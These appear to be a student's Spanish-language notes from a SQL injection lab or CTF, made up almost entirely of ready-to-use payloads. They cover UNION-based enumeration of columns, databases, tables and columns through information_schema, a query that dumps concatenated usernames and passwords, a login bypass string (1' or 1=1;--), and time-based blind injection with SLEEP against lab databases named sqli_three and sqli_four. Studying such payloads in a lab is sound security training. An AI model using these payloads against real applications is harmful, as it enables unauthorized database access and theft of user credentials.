# Apuntes

#### Despues de lo siguiente revisar la herramienta sqlninja

1 si podemos ver los resultados, union nos servira para obtener mas info
```sql
--Validar nro de columnas
0 UNION SELECT 1,2,3,...
--Verificar nombre de database
0 UNION SELECT 1,2,database()
--listar tablas
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'db_name'
--listar columnas
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 't_name'
--listar datos concatenados
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM t_name
--Enjoy
```

2. Bypass

```sql
--posible bypass en password
1' or 1=1;--

admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
```


e4

`admin123' UNION SELECT SLEEP(1),2 where database() like 'sqli_four%';--`

database = sqli_four

admin123' UNION SELECT SLEEP(1),2 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name like 'users%';--

tabla = users